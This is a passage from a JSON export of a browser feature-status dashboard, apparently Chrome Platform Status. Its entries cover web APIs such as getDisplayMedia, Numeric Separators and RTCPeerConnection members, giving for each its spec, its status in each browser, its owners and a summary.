        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The shape feature describes the general shape of the targeted display area of the output device.\r\n\r\n",
    "id": 5167313951129600,
    "resources": {
      "samples": [
        "https://github.com/anawhj/jRound"
      ]
    }
  },
  {
    "category": "Web RTC",
    "updated": {
      "when": "2018-06-14 15:13:57.308041",
      "by": "jmedley@google.com"
    },
    "name": "MediaStream.getDisplayMedia()",
    "tags": [
      "WebRTC",
      "screencast",
      "screen capture"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/mediacapture-screen-share",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "niklase@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>MediaStream"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=326740",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Capture a screen or application window to a MediaStream, for recording or sharing over the network.\r\n\r\nThis allows conferencing services to provide shared presentations into a conference, and allows remote control tools like Chrome Remote Desktop to provide an image of the controlled computer's screen to the controlling computer.\r\n",
    "id": 6744724455030784,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-02-06 16:14:30.241610",
      "by": "guidou@chromium.org"
    },
    "name": "MediaStreamTrack.getCapabilities()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/mediacapture-main/#dom-mediastreamtrack-getcapabilities()",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "guidou@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>GetUserMedia"
        ],
        "flag": false,
        "bug": "http://crbug.com/293292",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/documentation/apireference/interfaces/mediastreamtrack/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Returns the capabilities of the source associated to a MediaStreamTrack.\r\n\r\nThere is also a variant InputDeviceInfo.getCapabilities(), available in the results of MediaDevices.enumerateDevices().\r\nThese devices are used as sources for MediaStreamTrack and getCapabilities() in this case returns the same values as MediaStreamTrack.getCapabilities().",
    "id": 5145556682801152,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaStreamTrack/getCapabilities"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:58.639900",
      "by": "ericbidelman@google.com"
    },
    "name": "Memory Pressure API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://github.com/WICG/memory-pressure/blob/master/explainer.md",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "panicker@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=708752",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://docs.google.com/document/d/1RigHs7a4yRcVUt4fPswOZLKY_-tDlPiz8hPokBixHEk/edit#bookmark=id.46whcz4yijpn",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://docs.google.com/document/d/1RigHs7a4yRcVUt4fPswOZLKY_-tDlPiz8hPokBixHEk/edit#bookmark=id.46whcz4yijpn",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "API to to expose the memory pressure signal received by the system to web applications.\r\n",
    "id": 5719614029824000,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1tNZP12J6J-ZynaI8A4gfvPxH8QlyS55dZ8IpFqby0V8/edit"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-09-17 08:58:29.034380",
      "by": "Patket@microsoft.com"
    },
    "name": "Merge DOMSettableTokenList into DOMTokenList",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/whatwg/html/commit/98183f98c609d61e508bbec46b7ab86d37b99b47",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1244328",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "yoav@yoav.ws"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=584612",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=153677",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Merge DOMSettableTokenList into DOMTokenList in order to simplify spec and implementation.",
    "id": 5720372066385920,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:09.943380",
      "by": "ericbidelman@google.com"
    },
    "name": "More strict checking of valid URL hostname characters",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://tools.ietf.org/html/rfc3986",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "brettw@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=652808",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "These characters, if encountered in the host name portion of a URL, are accepted and percent-escaped.\r\n\r\n  <space> , } { * ‘ ( & ) > < | \" = $ ! @ ` #\r\n\r\nThese characters are disallowed by the spec and are generally unsupported, although in rare cases they can work. Chrome will remove this category of accepted-but-escaped characters in URL host names and treat such URLs as invalid.",
    "id": 6059320944885760,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1KezMGpTwMJSYW3Jb9cvvi4fRuZ0r5AGbS-Phe-A6WeQ/edit#"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-06-05 22:10:13.807490",
      "by": "japhet@google.com"
    },
    "name": "Nested dedicated workers",
    "comments": "Dedicated workers and shared workers can create nested workers, but service workers cannot.\r\n\r\nNested shared workers are also in the spec, but there is no plan to support them at this time.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/#workers",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "japhet@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Workers"
        ],
        "flag": false,
        "bug": "https://crbug.com/31666",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "This allows workers to spawn additional, descendant dedicated workers.\r\n\r\nThis can be used to better distribute tasks without needing time on the main thread where rendering and user input are being handled. This also allows libraries which use workers to be adapted to run in a worker context themselves, giving developers more options to move business logic off of the main thread.",
    "id": 6080438103703552,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-05-18 18:09:24.012660",
      "by": "dcreager@chromium.org"
    },
    "name": "Network Error Logging",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/network-error-logging/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "dcreager@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=338852",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://status.modern.ie/networkerrorlogging",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Defines a mechanism that enables developers to declare a network error reporting policy for a web application. A user agent can use this policy to report encountered network errors that prevented it from successfully fetching requested resources.",
    "id": 5391249376804864,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-03-15 16:57:20.116820",
      "by": "gsathya@chromium.org"
    },
    "name": "Numeric Separators",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://tc39.github.io/proposal-numeric-separator/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1421400",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "gsathya@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7317",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature enables developers to make their numeric literals more readable by creating a visual separation between groups of digits. Using underscores (_, U+005F) as separators helps improve readability for numeric literals, for ex: 1_000_000_000.",
    "id": 5829906369871872,
    "resources": {
      "samples": [
        "http://2ality.com/2018/02/numeric-separators.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-08-04 15:41:49.648160",
      "by": "ericbidelman@google.com"
    },
    "name": "Origin Policy",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://wicg.github.io/origin-policy/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mkwst@chromium.org",
          "dhausknecht@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "flag": false,
        "bug": "https://crbug.com/751996",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Origin Policy provides a mechanism for defining configuration options with origin-wide impact.",
    "id": 5708023506927616,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:43.530170",
      "by": "ericbidelman@google.com"
    },
    "name": "Parse SVG as HTML",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.w3.org/TR/SVG/implnote.html#ErrorProcessing",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "pdr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/243882",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Switch all SVG parsing to use the HTML parser.",
    "id": 5630599045840896,
    "resources": {}
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-11-10 17:43:30.374880",
      "by": "zstein@chromium.org"
    },
    "name": "Partial RTCRtpSynchronizationSource Support",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webrtc-pc/#dom-rtcrtpreceiver",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "zstein@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=775668",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add getSynchroniationSources to RTCRtpReceiver and implement the timestamp, source, and audioLevel properties of RTCRtpSynchronizationSource. The audioLevel attribute will only be set if the RFC 6464 header extension is present in the corresponding RTP packet. ",
    "id": 5637113429098496,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:56.425080",
      "by": "ericbidelman@google.com"
    },
    "name": "Permissions.request() and Permissions.revoke()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/permissions/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/d/msg/mozilla.dev.platform/7RnCrXoXdG4/Oy84atEoKgAJ",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mlamouri@chromium.org",
          "lalitm@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/510405",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Provide a method for websites to request a permission directly. This is something that is already doable for most APIs using some ways around the lack of proper call. It can also be used to improve UI by requesting multiple permissions at once.\r\nThe revoking bit is for completeness: it allows a website to revoke a permission which can be used for example when a user disable some options.",
    "id": 5707368532803584,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:12.830970",
      "by": "ericbidelman@google.com"
    },
    "name": "Presentation API: PresentationConnection.close()",
    "tags": [
      "presentation",
      "cast"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/presentation-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1192101",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mfoltz@chromium.org",
          "avayvod@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/540803",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add support for close() method in Presentation API's PresentationConnection interface. This method allows closing a connection without terminating the session. This is in addition of terminate() that is already available.",
    "id": 6272311736926208,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-05-22 14:28:46.665930",
      "by": "jmedley@google.com"
    },
    "name": "Push API : Allow passing a base64url-encoded value to `applicationServerKey`",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://w3c.github.io/push-api/#idl-def-pushsubscriptionoptionsinit",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1337348",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "hs1217.lee@samsung.com",
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PushAPI"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=802280",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The applicationServerKey option is used by the user agent when establishing a push subscription with a push service. This is the key that the application server will use to authenticate itself when sending push messages to this push subscription. Currently, applicationServerKey only supports BufferSource in Chrome. After this change, it can also accept a base64url encoded value.",
    "id": 5242984710799360,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PushManager/subscribe"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:04.245630",
      "by": "ericbidelman@google.com"
    },
    "name": "RTCCertificate.getFingerprints()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webrtc-pc/archives/20170313/webrtc.html#rtccertificate-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "hbos@chromium.org",
          "guidou@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "WebRTC"
        ],
        "flag": false,
        "bug": "https://crbug.com/698313",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "RTCCertificate is supposed to have a getFingerprints() method.",
    "id": 5759223426187264,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-06-22 14:24:26.170271",
      "by": "jmedley@google.com"
    },
    "name": "RTCDataChannelInit.maxPacketLifeTime",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/webrtc/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "deadbeef@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=696681",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The RTCDataChannelInit.maxRetransmitTime dictionary member is being renamed to maxPacketLifeTime. This member is used to construct an unreliable data channel, which will stop attempting to retransmit a message after \"maxPacketLifeTime\" milliseconds.\r\n\r\nAn unreliable data channel may be used to, for example, send non-critical information to a user about the reason for a state update in a video chat or conference.",
    "id": 5198350873788416,
    "resources": {
      "docs": [
        "https://www.w3.org/TR/webrtc/#dom-rtcdatachannelinit-maxpacketlifetime"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-07-20 21:39:46.477990",
      "by": "jmedley@google.com"
    },
    "name": "RTCPeerConnection.getConfiguration",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/webrtc/#dom-rtcpeerconnection-getconfiguration",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "deadbeef@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebRTC>Network"
        ],
        "flag": false,
        "bug": "http://crbug.com/587453",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Implement getConfiguration according to WebRTC 1.0. Returns the last configuration applied via setConfiguration, or if setConfiguration hasn't been called, the configuration the RTCPeerConnection was constructed with.",
    "id": 5271355306016768,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/getConfiguration"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-03 16:01:56.512200",
      "by": "guidou@chromium.org"
    },
    "name": "RTCPeerConnection.id (Origin Trial)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://docs.google.com/document/d/1Xr4CF7Arg_0v3QdIOT8eCXPYc6hCZo7Ud1B6zPTcSl4/edit#heading=h.27qen9z79dwm",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "eladalon@chromium.org",
          "terelius@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebRTC"
        ],
        "flag": false,
        "bug": "https://crbug.com/775415",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "RTCPeerConnection.id provides a string that identifies an RTCPeerConnection. This is useful when a peer connection needs to be referenced outside the JavaScript context, for example, on the server side, or by a logging mechanism.",
    "id": 5699859591987200,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1Xr4CF7Arg_0v3QdIOT8eCXPYc6hCZo7Ud1B6zPTcSl4/edit#heading=h.27qen9z79dwm"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-08-07 22:14:36.086360",
      "by": "ericbidelman@google.com"
    },
    "name": "RTCPeerConnection.onicegatheringstatechange",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/webrtc-pc/#event-icegatheringstatechange",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "fippo@appear.in",
          "hbos@chromium.org",
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "flag": false,
        "bug": "http://crbug.com/681083",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature adds the icegatheringstatechange event and the onicegatheringstatechange event handler to RTCPeerConnection.",
    "id": 5738839242964992,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/onicegatheringstatechange"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-02-19 07:40:27.319750"
    },
    "name": "RTCRtpSender: dtmf attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://w3c.github.io/webrtc-pc/#peer-to-peer-dtmf",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://wpt.fyi/webrtc/RTCDTMFSender-insertDTMF.https.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "flag": false,
        "bug": "https://crbug.com/812587",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This attribute allows access to the DTMF feature of a PeerConnection's audio track.\r\n\r\nIt is a replacement for the now non-standard CreateDTMFSender function on a PeerConnection.\r\n",
    "id": 5404276117471232,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-03-27 15:15:15.557010",
      "by": "jmedley@google.com"
    },
    "name": "Reject PaymentRequest.show with SecurityError DOMException if it is not triggered by user activation",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.w3.org/TR/payment-request/#show-method",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
